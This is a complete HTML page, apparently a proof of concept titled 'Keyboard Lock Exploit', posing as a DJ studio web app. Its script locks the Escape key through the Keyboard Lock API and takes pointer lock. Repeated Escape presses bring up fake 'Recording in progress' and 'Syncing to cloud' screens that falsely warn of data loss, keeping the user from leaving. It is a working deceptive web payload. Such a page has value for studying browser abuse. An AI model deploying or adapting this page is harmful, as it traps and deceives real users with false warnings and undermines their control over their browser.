<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>WebAudio Live DJ Studio - Keyboard Lock Exploit</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        overflow: hidden;
        background: linear-gradient(135deg, #1e3c72 0%, #2a5298 50%, #7e22ce 100%);
        font-family: 'Arial', sans-serif;
        color: white;
      }
      #container {
        width: 100vw;
        height: 100vh;
        display: flex;
        flex-direction: column;
      }
      
      /* Top Bar */
      #top-bar {
        background: rgba(0,0,0,0.8);
        padding: 15px 30px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-bottom: 2px solid rgba(255,255,255,0.1);
        z-index: 1000;
      }
      .app-title {
        font-size: 24px;
        font-weight: bold;
        background: linear-gradient(90deg, #ff0080, #ff8c00, #40e0d0);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
      }
      .status-indicators {
        display: flex;
        gap: 20px;
        font-size: 14px;
      }
      .status-item {
        display: flex;
        align-items: center;
        gap: 8px;
      }
      .status-dot {
        width: 10px;
        height: 10px;
        border-radius: 50%;
        background: #666;
      }
      .status-dot.active {
        background: #00ff88;
        box-shadow: 0 0 10px #00ff88;
        animation: pulse-dot 1.5s infinite;
      }
      @keyframes pulse-dot {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.5; }
      }
      
      /* Main Canvas Area */
      canvas {
        flex: 1;
        display: block;
        cursor: pointer;
        background: rgba(0,0,0,0.3);
      }
      
      /* Instructions Modal */
      #instructions {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: linear-gradient(145deg, rgba(30, 60, 114, 0.98), rgba(126, 34, 206, 0.98));
        padding: 50px;
        border-radius: 25px;
        text-align: center;
        z-index: 2000;
        max-width: 650px;
        box-shadow: 0 30px 100px rgba(0,0,0,0.8);
        border: 3px solid rgba(255,255,255,0.2);
      }
      #instructions.hidden {
        display: none;
      }
      #instructions h1 {
        font-size: 42px;
        margin-bottom: 25px;
        text-transform: uppercase;
        letter-spacing: 3px;
        background: linear-gradient(90deg, #ff0080, #ff8c00);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
      }
      #instructions p {
        font-size: 18px;
        line-height: 1.8;
        margin-bottom: 15px;
      }
      .dj-icon {
        width: 120px;
        height: 120px;
        margin: 0 auto 30px;
      }
      .highlight {
        color: #ff8c00;
        font-weight: bold;
      }
      
      /* Control Panel HUD */
      #control-panel {
        position: fixed;
        bottom: 30px;
        left: 50%;
        transform: translateX(-50%);
        background: rgba(0,0,0,0.9);
        padding: 25px 40px;
        border-radius: 20px;
        display: none;
        gap: 40px;
        border: 2px solid rgba(255, 128, 0, 0.5);
        box-shadow: 0 10px 40px rgba(0,0,0,0.8);
      }
      #control-panel.active {
        display: flex;
      }
      .control-item {
        text-align: center;
      }
      .control-label {
        font-size: 12px;
        opacity: 0.7;
        margin-bottom: 8px;
        text-transform: uppercase;
      }
      .control-value {
        font-size: 28px;
        font-weight: bold;
        color: #ff8c00;
      }
      
      /* Fake "Recording in Progress" Warning */
      #fake-recording-warning {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        background: rgba(0,0,0,0.98);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 3000;
      }
      .recording-box {
        background: linear-gradient(145deg, #2a0e0e, #4a1515);
        padding: 60px;
        border-radius: 25px;
        border: 3px solid #ff3333;
        box-shadow: 0 30px 100px rgba(255, 51, 51, 0.4);
        max-width: 700px;
        text-align: center;
        animation: recording-pulse 2s infinite;
      }
      @keyframes recording-pulse {
        0%, 100% { box-shadow: 0 30px 100px rgba(255, 51, 51, 0.4); }
        50% { box-shadow: 0 30px 120px rgba(255, 51, 51, 0.7); }
      }
      .rec-icon {
        width: 80px;
        height: 80px;
        background: #ff3333;
        border-radius: 50%;
        margin: 0 auto 30px;
        position: relative;
        animation: rec-blink 1s infinite;
      }
      @keyframes rec-blink {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.3; }
      }
      .rec-icon::before {
        content: "REC";
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        font-size: 18px;
        font-weight: bold;
        color: white;
      }
      .recording-box h2 {
        font-size: 36px;
        color: #ff3333;
        margin-bottom: 25px;
        text-transform: uppercase;
      }
      .recording-box p {
        font-size: 18px;
        line-height: 1.8;
        color: #e0e0e0;
        margin-bottom: 20px;
      }
      .recording-info {
        background: rgba(0,0,0,0.6);
        padding: 25px;
        border-radius: 15px;
        margin: 25px 0;
        text-align: left;
        border-left: 4px solid #ff8c00;
      }
      .recording-info div {
        margin-bottom: 12px;
        font-size: 16px;
        display: flex;
        justify-content: space-between;
      }
      .recording-info .label {
        opacity: 0.7;
      }
      .recording-info .value {
        color: #ff8c00;
        font-weight: bold;
      }
      
      /* Fake "Cloud Sync" Overlay */
      #fake-sync-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        background: linear-gradient(135deg, #1e3c72, #2a5298);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 3000;
        flex-direction: column;
      }
      .sync-content {
        text-align: center;
        max-width: 600px;
      }
      .sync-content h2 {
        font-size: 40px;
        margin-bottom: 30px;
        background: linear-gradient(90deg, #40e0d0, #ff8c00);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
      }
      .cloud-icon {
        width: 120px;
        height: 120px;
        margin: 0 auto 40px;
        animation: float 3s ease-in-out infinite;
      }
      @keyframes float {
        0%, 100% { transform: translateY(0px); }
        50% { transform: translateY(-20px); }
      }
      .sync-progress {
        width: 500px;
        height: 10px;
        background: rgba(255,255,255,0.2);
        border-radius: 5px;
        overflow: hidden;
        margin: 0 auto 25px;
      }
      .sync-progress-bar {
        width: 0%;
        height: 100%;
        background: linear-gradient(90deg, #40e0d0, #ff8c00);
        animation: sync-progress 4s ease-in-out infinite;
      }
      @keyframes sync-progress {
        0% { width: 0%; }
        50% { width: 75%; }
        100% { width: 95%; }
      }
      .sync-files {
        font-size: 14px;
        opacity: 0.8;
        margin-bottom: 10px;
      }
      .sync-warning {
        font-size: 16px;
        color: #ff8c00;
        margin-top: 30px;
        padding: 20px;
        background: rgba(0,0,0,0.4);
        border-radius: 10px;
      }
    </style>
  </head>
  <body>
    <div id="container">
      <!-- Top Bar -->
      <div id="top-bar">
        <div class="app-title">üéß DJ STUDIO PRO</div>
        <div class="status-indicators">
          <div class="status-item">
            <div class="status-dot" id="live-dot"></div>
            <span id="live-status">Offline</span>
          </div>
          <div class="status-item">
            <div class="status-dot" id="pointer-dot"></div>
            <span id="pointer-status">Pointer: Inactive</span>
          </div>
          <div class="status-item">
            <div class="status-dot" id="keyboard-dot"></div>
            <span id="keyboard-status">Controls: Inactive</span>
          </div>
        </div>
      </div>
      
      <!-- Instructions -->
      <div id="instructions">
        <svg class="dj-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <circle cx="12" cy="12" r="10" stroke="#ff8c00" stroke-width="2"/>
          <circle cx="12" cy="12" r="6" fill="#ff8c00"/>
          <path d="M12 2v4M12 18v4M2 12h4M18 12h4" stroke="#ff8c00" stroke-width="2"/>
        </svg>
        <h1>üéµ DJ STUDIO</h1>
        <p><span class="highlight">Click anywhere</span> to enter Live Performance Mode</p>
        <p>Precision pointer control will be activated for pad interaction</p>
        <p>Your session will be auto-recorded for cloud backup</p>
        <p>Press <span class="highlight">ESC</span> to stop recording & access settings</p>
        <p style="font-size: 14px; opacity: 0.6; margin-top: 30px;">
          ‚ö†Ô∏è All performances are automatically saved to the cloud
        </p>
      </div>
      
      <!-- DJ Pad Canvas -->
      <canvas id="canvas"></canvas>
      
      <!-- Control Panel HUD -->
      <div id="control-panel">
        <div class="control-item">
          <div class="control-label">BPM</div>
          <div class="control-value" id="bpm">128</div>
        </div>
        <div class="control-item">
          <div class="control-label">Recording</div>
          <div class="control-value" id="rec-time">00:00</div>
        </div>
        <div class="control-item">
          <div class="control-label">Volume</div>
          <div class="control-value" id="volume">85%</div>
        </div>
        <div class="control-item">
          <div class="control-label">FX</div>
          <div class="control-value">REVERB</div>
        </div>
      </div>
      
      <!-- Fake Recording Warning -->
      <div id="fake-recording-warning">
        <div class="recording-box">
          <div class="rec-icon"></div>
          <h2>‚ö†Ô∏è RECORDING IN PROGRESS</h2>
          <p>
            <strong>Cannot exit while recording!</strong>
            <br><br>
            Your live performance is being recorded to cloud storage.
            Interrupting now will result in:
          </p>
          <div class="recording-info">
            <div>
              <span class="label">Current Session:</span>
              <span class="value">00:03:47</span>
            </div>
            <div>
              <span class="label">File Size:</span>
              <span class="value">47.3 MB</span>
            </div>
            <div>
              <span class="label">Cloud Storage:</span>
              <span class="value">Syncing...</span>
            </div>
            <div>
              <span class="label">Quality:</span>
              <span class="value">320 kbps</span>
            </div>
          </div>
          <p style="font-size: 16px; color: #ff8c00; margin-top: 20px;">
            ‚ö†Ô∏è <strong>Data Loss Warning:</strong> Exiting now will discard all unsaved work
          </p>
          <p style="font-size: 14px; opacity: 0.7; margin-top: 20px;">
            Please use the "Stop Recording" button in the control panel
            <br>
            Or hold ESC for 3 seconds to force quit (not recommended)
          </p>
        </div>
      </div>
      
      <!-- Fake Cloud Sync Overlay -->
      <div id="fake-sync-overlay">
        <div class="sync-content">
          <svg class="cloud-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M18 10h-1.26A8 8 0 1 0 9 17h9a5 5 0 0 0 0-10z" stroke="white" stroke-width="2" fill="none"/>
            <path d="M12 13v8M12 13l-3 3M12 13l3 3" stroke="#40e0d0" stroke-width="2" stroke-linecap="round"/>
          </svg>
          <h2>Syncing to Cloud</h2>
          <div class="sync-progress">
            <div class="sync-progress-bar"></div>
          </div>
          <p class="sync-files">Uploading: Live_Mix_Session_20241230.wav</p>
          <p class="sync-files">Uploading: Project_Settings.json</p>
          <p class="sync-files">Uploading: Audio_Stems_Bundle.zip</p>
          <div class="sync-warning">
            ‚ö†Ô∏è <strong>Do not close the browser or press ESC</strong>
            <br>
            Incomplete sync may corrupt your project files
            <br><br>
            <span style="font-size: 14px; opacity: 0.7;">
              Estimated time remaining: 45 seconds
            </span>
          </div>
        </div>
      </div>
    </div>
    
    <script>
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");
      const instructions = document.getElementById("instructions");
      const controlPanel = document.getElementById("control-panel");
      const fakeRecordingWarning = document.getElementById("fake-recording-warning");
      const fakeSyncOverlay = document.getElementById("fake-sync-overlay");
      
      const liveDot = document.getElementById("live-dot");
      const liveStatus = document.getElementById("live-status");
      const pointerDot = document.getElementById("pointer-dot");
      const pointerStatus = document.getElementById("pointer-status");
      const keyboardDot = document.getElementById("keyboard-dot");
      const keyboardStatus = document.getElementById("keyboard-status");
      
      const bpmDisplay = document.getElementById("bpm");
      const recTimeDisplay = document.getElementById("rec-time");
      const volumeDisplay = document.getElementById("volume");
      
      let isLiveMode = false;
      let isPointerLocked = false;
      let isKeyboardLocked = false;
      let mouseX = 0, mouseY = 0;
      let escPressCount = 0;
      let lastEscPressTime = 0;
      let recordingTime = 0;
      
      // DJ Pads (4x4 grid)
      const pads = [];
      const padRows = 4;
      const padCols = 4;
      const colors = ['#ff0080', '#ff8c00', '#40e0d0', '#00ff88', '#8b5cf6', '#3b82f6', '#ef4444', '#f59e0b'];
      
      for (let i = 0; i < padRows * padCols; i++) {
        pads.push({
          active: false,
          color: colors[i % colors.length],
          intensity: 0
        });
      }

      function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight - 60; // Account for top bar
        drawPads();
      }

      resizeCanvas();
      window.addEventListener("resize", resizeCanvas);

      // Enter Live Performance Mode
      canvas.addEventListener("click", async () => {
        try {
          instructions.classList.add("hidden");
          
          // Activate "Live Mode"
          isLiveMode = true;
          liveDot.classList.add("active");
          liveStatus.textContent = "Live Performance";
          
          // Lock keyboard (ESC)
          await lockKeyboard();
          
          // Request pointer lock
          canvas.requestPointerLock =
            canvas.requestPointerLock ||
            canvas.mozRequestPointerLock ||
            canvas.webkitRequestPointerLock;
          canvas.requestPointerLock();
          
          controlPanel.classList.add("active");
          
          // Start "recording" timer
          setInterval(() => {
            if (isLiveMode) {
              recordingTime++;
              const mins = Math.floor(recordingTime / 60).toString().padStart(2, '0');
              const secs = (recordingTime % 60).toString().padStart(2, '0');
              recTimeDisplay.textContent = `${mins}:${secs}`;
            }
          }, 1000);
          
        } catch (err) {
          console.error("Failed to enter live mode:", err);
        }
      });

      // Pointer lock handlers
      document.addEventListener("pointerlockchange", handlePointerLock);
      document.addEventListener("mozpointerlockchange", handlePointerLock);
      document.addEventListener("webkitpointerlockchange", handlePointerLock);

      function handlePointerLock() {
        if (document.pointerLockElement === canvas) {
          isPointerLocked = true;
          pointerDot.classList.add("active");
          pointerStatus.textContent = "Pointer: Locked";
          console.log("Pointer locked - DJ mode active");
          
          document.addEventListener("mousemove", handleMouseMove);
          document.addEventListener("click", handlePadClick);
          document.addEventListener("keydown", handleKeyDown);
          
        } else {
          isPointerLocked = false;
          pointerDot.classList.remove("active");
          pointerStatus.textContent = "Pointer: Inactive";
          console.log("Pointer unlocked");
          
          document.removeEventListener("mousemove", handleMouseMove);
          document.removeEventListener("click", handlePadClick);
          document.removeEventListener("keydown", handleKeyDown);
          
          exitLiveMode();
        }
      }

      function handleMouseMove(e) {
        mouseX += e.movementX;
        mouseY += e.movementY;
        
        mouseX = Math.max(0, Math.min(canvas.width, mouseX));
        mouseY = Math.max(0, Math.min(canvas.height, mouseY));
        
        drawPads();
      }

      function handlePadClick() {
        const padWidth = canvas.width / padCols;
        const padHeight = canvas.height / padRows;
        
        const col = Math.floor(mouseX / padWidth);
        const row = Math.floor(mouseY / padHeight);
        const index = row * padCols + col;
        
        if (index >= 0 && index < pads.length) {
          pads[index].active = !pads[index].active;
          pads[index].intensity = 1.0;
          
          // Simulate BPM change
          bpmDisplay.textContent = Math.floor(Math.random() * 40) + 110;
          volumeDisplay.textContent = (Math.floor(Math.random() * 30) + 70) + "%";
        }
      }

      // ESC key interception
      function handleKeyDown(e) {
        if (e.key === "Escape" && isKeyboardLocked) {
          const currentTime = Date.now();
          
          if (currentTime - lastEscPressTime > 2000) {
            escPressCount = 0;
          }
          
          escPressCount++;
          lastEscPressTime = currentTime;
          
          console.log(`ESC pressed ${escPressCount}x in DJ mode - intercepted!`);
          
          // Show different warnings
          if (escPressCount === 1) {
            console.log("Showing recording warning");
            showRecordingWarning();
          } else if (escPressCount === 2) {
            console.log("Showing cloud sync overlay");
            showSyncOverlay();
          }
          // 3rd press triggers browser's "hold ESC" dialog
          
          e.preventDefault();
          e.stopPropagation();
        }
      }

      async function lockKeyboard() {
        try {
          if ("keyboard" in navigator) {
            await navigator.keyboard.lock(["Escape"]);
            isKeyboardLocked = true;
            keyboardDot.classList.add("active");
            keyboardStatus.textContent = "Controls: Locked";
            console.log("Keyboard locked - ESC intercepted");
          }
        } catch (err) {
          console.error("Keyboard lock failed:", err);
        }
      }

      function unlockKeyboard() {
        if ("keyboard" in navigator) {
          navigator.keyboard.unlock();
          isKeyboardLocked = false;
          keyboardDot.classList.remove("active");
          keyboardStatus.textContent = "Controls: Inactive";
        }
      }

      function showRecordingWarning() {
        fakeRecordingWarning.style.display = "flex";
        fakeSyncOverlay.style.display = "none";
      }

      function showSyncOverlay() {
        fakeSyncOverlay.style.display = "flex";
        fakeRecordingWarning.style.display = "none";
      }

      function hideAllFakeOverlays() {
        fakeRecordingWarning.style.display = "none";
        fakeSyncOverlay.style.display = "none";
        escPressCount = 0;
      }

      function exitLiveMode() {
        isLiveMode = false;
        liveDot.classList.remove("active");
        liveStatus.textContent = "Offline";
        
        unlockKeyboard();
        hideAllFakeOverlays();
        
        controlPanel.classList.remove("active");
        instructions.classList.remove("hidden");
        recordingTime = 0;
      }

      // Draw DJ Pads
      function drawPads() {
        ctx.fillStyle = "rgba(0,0,0,0.3)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        const padWidth = canvas.width / padCols;
        const padHeight = canvas.height / padRows;
        const padding = 5;
        
        for (let row = 0; row < padRows; row++) {
          for (let col = 0; col < padCols; col++) {
            const index = row * padCols + col;
            const pad = pads[index];
            
            const x = col * padWidth + padding;
            const y = row * padHeight + padding;
            const w = padWidth - padding * 2;
            const h = padHeight - padding * 2;
            
            // Fade intensity
            if (pad.intensity > 0) {
              pad.intensity -= 0.02;
            }
            
            // Draw pad
            const alpha = pad.active ? 0.9 : 0.3;
            ctx.fillStyle = pad.color + Math.floor(alpha * 255).toString(16).padStart(2, '0');
            ctx.fillRect(x, y, w, h);
            
            // Glow effect if active
            if (pad.active && pad.intensity > 0) {
              ctx.shadowBlur = 30;
              ctx.shadowColor = pad.color;
              ctx.fillStyle = pad.color + Math.floor(pad.intensity * 255).toString(16).padStart(2, '0');
              ctx.fillRect(x, y, w, h);
              ctx.shadowBlur = 0;
            }
          }
        }
        
        // Draw cursor
        if (isPointerLocked) {
          ctx.strokeStyle = "white";
          ctx.lineWidth = 3;
          ctx.beginPath();
          ctx.arc(mouseX, mouseY, 20, 0, Math.PI * 2);
          ctx.stroke();
          
          ctx.fillStyle = "rgba(255,255,255,0.5)";
          ctx.beginPath();
          ctx.arc(mouseX, mouseY, 5, 0, Math.PI * 2);
          ctx.fill();
        }
        
        requestAnimationFrame(drawPads);
      }

      drawPads();
    </script>
  </body>
</html>
